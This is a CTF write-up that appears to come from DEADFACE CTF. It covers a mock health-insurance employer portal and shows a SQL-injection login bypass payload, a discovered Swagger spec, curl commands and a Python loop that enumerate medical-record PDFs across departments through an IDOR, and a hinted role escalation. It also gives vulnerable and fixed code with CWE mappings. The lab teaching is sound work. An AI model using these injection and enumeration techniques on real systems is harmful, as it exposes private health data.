# RP-01 (3 of 4) — Do People Still Fax in 2026?

**Event:** DEADFACE CTF
**Category:** Web
**Target:** `http://45.79.200.170:3000/` (Health Spark Employer Portal)
**Flag:** `deadface{someone_should_report_this}`

---

## TL;DR

The portal hides an API documentation site at `/api-docs/`. Its embedded OpenAPI
spec describes an undocumented endpoint:

```
POST /file_document?id=<n>     body: {"departmentid": <n>}
```

It streams a member's medical-record PDF, and it authorises on the
**department supplied in the request body** rather than the department in your
token. So you point it at the other employer's department, walk the document id
space, and download a record that isn't yours.

```
john.smith's token (dept 10685) + {"departmentid": 18432} + id=1020
  -> 200 OK, application/pdf, "Health Spark Member Record 1020"
  -> deadface{someone_should_report_this}
```

The same id with `{"departmentid": 10685}` returns **403** — which is the whole
vulnerability in one comparison.

---

## 1. Getting in

The login form is still SQL-injectable and still discloses the matched row:

```bash
curl -s -X POST http://45.79.200.170:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' OR 1=1-- -","password":"x"}'
```

```json
{"message":"Login failed. That's weird... check the network traffic!",
 "username":"john.smith","name":"John Smith","role":"user",
 "departmentid":10685,"password":"Locked_In_And_Ready",
 "flag":"deadface{typical_and_classic}"}
```

Log in with those credentials for a real JWT. Note the JWT carries
`departmentid: 10685` — remember that, it becomes the pivot.

---

## 2. The breadcrumb

`POST /api/patients` for department 10685 returns ten members. One of them is
slightly off:

```
Helena Boyd | HS-4471910 | 622-31-4078 | 1988-08-15 | Osteoarthritis, knee — see document #1009
```

"see document #1009" is the pointer to the document feature. There is no
`/api/documents`, `/documents/1009`, or `/files/1009` though — a few hundred
guessed paths and every HTTP verb return 404. The endpoint isn't guessable.

---

## 3. Finding the docs site

The challenge name is the hint: *"websites with documents"*. Not data
documents — **API documentation**.

```bash
curl -i http://45.79.200.170:3000/api-docs
```

```
HTTP/1.1 301 Moved Permanently
Location: /api-docs/
```

Following the redirect lands on a Swagger UI titled *Health Spark API Docs*.
The spec isn't a separate `openapi.json` — it's inlined in
`/api-docs/swagger-ui-init.js`:

```bash
curl -s http://45.79.200.170:3000/api-docs/swagger-ui-init.js
```

```json
{
  "openapi": "3.0.3",
  "info": { "title": "Health Spark Member API", "version": "2.0.0" },
  "paths": {
    "/file_document": { ... },
    "/api/profile":   { ... },
    "/api/admin/fetch-photo": { ... },
    "/api/existing_names": { "get": { ... } },
    "/api/department_id":  { "get": { ... } }
  }
}
```

Four routes that appear nowhere in the frontend. The interesting one:

```json
"/file_document": {
  "post": {
    "summary": "Download a member document (PDF)",
    "description": "Streams the member intake/medical record PDF for the document
                    id in the query string. Requires a valid bearer token, and the
                    department that owns the document must be supplied in the body.
                    The website can only host 1000 files at most.",
    "parameters": [{ "name": "id", "in": "query", "schema": {"type":"integer"}, "example": 1009 }],
    "requestBody": { "required": true,
      "content": { "application/json": { "schema": {
        "required": ["departmentid"],
        "properties": { "departmentid": { "type": "integer", "example": 10685 } } } } } }
  }
}
```

Two things to take from that prose:

1. **"the department that owns the document must be supplied in the body"** —
   the caller declares the owner. Nothing ties it to the JWT.
2. **"can only host 1000 files at most"** — the id space is small enough to
   walk. (The example id, 1009, is the one from Helena's record.)

The utility endpoints hand over the rest of the map:

```bash
curl -s -H "Authorization: Bearer $TOK" http://45.79.200.170:3000/api/department_id
# {"departmentIds":["10685","18432"]}

curl -s -H "Authorization: Bearer $TOK" http://45.79.200.170:3000/api/existing_names
# {"usernames":["john.smith"]}
```

---

## 4. Exploiting it

First confirm the endpoint works with your own department — the breadcrumb pays
off:

```bash
curl -s -X POST "http://45.79.200.170:3000/file_document?id=1009" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOK" \
  -d '{"departmentid":10685}' -o doc1009.pdf
# HTTP 200, Content-Type: application/pdf, 6837 bytes, member_1009.pdf
```

Now the same document id with the **other** department:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X POST "http://45.79.200.170:3000/file_document?id=1009" \
  -H 'Content-Type: application/json' -H "Authorization: Bearer $TOK" \
  -d '{"departmentid":18432}'
# 403
```

So ownership *is* checked — just against an attacker-controlled value. That
makes it a straightforward two-dimensional walk: for each department in
`/api/department_id`, iterate document ids.

```python
for dept in [10685, 18432]:
    for doc_id in range(1000, 1101):
        st, pdf = post("/file_document?id=%d" % doc_id, {"departmentid": dept})
        if st == 200 and pdf.startswith(b"%PDF"):
            flags = re.findall(rb"deadface\{[^}]*\}", pdf)
```

Results:

| id | dept | bytes | notes |
|---|---|---|---|
| 1001 | 18432 | 6820 | ordinary member record |
| 1009 | 10685 | 6837 | ours (Helena Boyd's, the breadcrumb) |
| **1020** | **18432** | **7183** | **`deadface{someone_should_report_this}`** |

Document 1020's text:

```
Health Spark Member Record 1020
Health Spark Member Services
Patient Intake & Medical Record
deadface{someone_should_report_this}
```

**Flag:** `deadface{someone_should_report_this}`

> Pacing matters. The app blocks an IP for 5 minutes after 1000 requests in 2
> minutes, and during the block it answers **`401 Invalid credentials`** — the
> same body as a failed login. That response is easy to misread as "my
> injection broke". Keep probes under ~8 req/s, and treat a run of 401s on
> payloads that previously worked as a rate-limit signal, not a logic change.

---

## 5. Root cause

Same defect class as the previous challenge in this series, on a new endpoint:

```js
// vulnerable
app.post('/file_document', requireAuth, (req, res) => {
  const dept = req.body.departmentid;        // attacker-controlled
  const doc  = docs.find(d => d.id === +req.query.id && d.departmentid === dept);
  if (!doc) return res.status(403).end();
  res.type('application/pdf').send(doc.pdf);
});
```

```js
// fixed - ownership comes from the verified token, never the body
app.post('/file_document', requireAuth, (req, res) => {
  const doc = docs.find(d => d.id === +req.query.id);
  if (!doc) return res.status(404).end();
  if (doc.departmentid !== req.user.departmentid) return res.status(403).end();
  res.type('application/pdf').send(doc.pdf);
});
```

| # | Issue | CWE |
|---|---|---|
| 1 | Object ownership taken from user input, not the session | CWE-639 / CWE-284 |
| 2 | Sequential, enumerable document identifiers | CWE-340 / CWE-200 |
| 3 | Full PHI (intake + medical record) served with no per-record audit | CWE-359 |
| 4 | API documentation published with no auth, describing internal endpoints | CWE-200 |

Practical fixes: scope the lookup to `req.user.departmentid`; use unguessable
document ids (UUIDs) or signed URLs; require a per-record authorisation check
against the member, not just the department; log every document read with
caller + record id and alert on cross-department access; and keep the OpenAPI
spec off the internet-facing listener (or behind auth).

---

## 6. Solve script

`solve_fax.py` runs the whole chain — SQLi for credentials, `/api-docs` for the
route list, `/api/department_id` for the department map, then the id walk:

```bash
python3 solve_fax.py                      # defaults to the challenge host
python3 solve_fax.py http://host:port
```

```
[*] Leaking credentials via /api/login SQLi
    [+] john.smith / Locked_In_And_Ready (dept 10685)
[*] Reading /api/department_id
    [+] departments: [10685, 18432] (ours: 10685)
[*] own doc 1009 -> HTTP 200 (6837 bytes)
[*] Hunting documents outside dept 10685 (spec hint: ~1000 files)
    [+] doc 1001 dept 18432 -> 6820 bytes
    [+] doc 1020 dept 18432 -> 7183 bytes deadface{someone_should_report_this}

 FLAG: deadface{someone_should_report_this}
```

---

## 7. What this unlocks (challenge 4 of 4)

The same spec documents:

```json
"/api/profile": {
  "summary": "Update your profile",
  "description": "Updates your profile and returns a refreshed session token.
                  Your submitted profile fields are reflected in the returned
                  session claims."
}
```

"Your submitted profile fields are reflected in the returned session claims"
means the new JWT is minted from whatever you post — so
`{"name":"x","role":"admin"}` should hand back an admin token, which is exactly
what `/api/admin/fetch-photo` (the SSRF into the internal media service) has
been refusing. That's the next challenge, not this one — but it's worth noting
that no JWT secret cracking is required anywhere in this series.

---

## Dead ends (worth recording)

- `/api/documents`, `/api/document`, `/api/docs`, `/api/files`, `/api/fax`,
  `/api/faxes`, `/api/media`, `/api/photos`, `/api/attachments`,
  `/api/records`, `/api/reports`, `/api/downloads`, `/api/uploads`,
  `/api/notes`, `/api/claims`, `/api/eobs`, `/api/scans`, `/api/archive`,
  `/api/exports`, `/api/thumbnails`, `/api/images`, `/api/objects`,
  `/api/store`, `/api/vault` — all 404, all methods.
- Path shapes `/api/<word>/<memberId>`, `/api/patients/<memberId>/<word>`,
  `/api/admin/<word>`, `/api/<word>?memberId=…`, plus the same without the
  `api/` prefix: ~590 combinations × {GET, POST} → zero hits.
- `/documents/1009`, `/document/1009`, `/files/1009`, `/fax/1009`,
  `/media/1009`, `/uploads/…`, `/downloads/…` → 404.
- Static data (`patients.json`, `data.json`, `members.json`,
  `departments.json`) and source/backups (`.env`, `.git/config`, `*.bak`,
  `backup.zip`) → 404.
- `/swagger.json`, `/openapi.json`, `/api/swagger.json`, `/redoc`,
  `/api-docs.json` → 404. Only the UI at `/api-docs/` exists, and its spec is
  inlined in `swagger-ui-init.js`.
- `/api/patients` ignores every extra body key (`documentId`, `docId`,
  `memberId`, `include`, `expand`, `select`, `action`, …) — the response is
  byte-identical to baseline, so there's no document mode hiding there.
- `/api/admin/fetch-photo` is genuinely gated on `role === 'admin'`; all 36
  forged-token variants (`alg:none`, empty/weak HS256 secrets, role strings)
  return 401, and the `users` table contains no admin row.
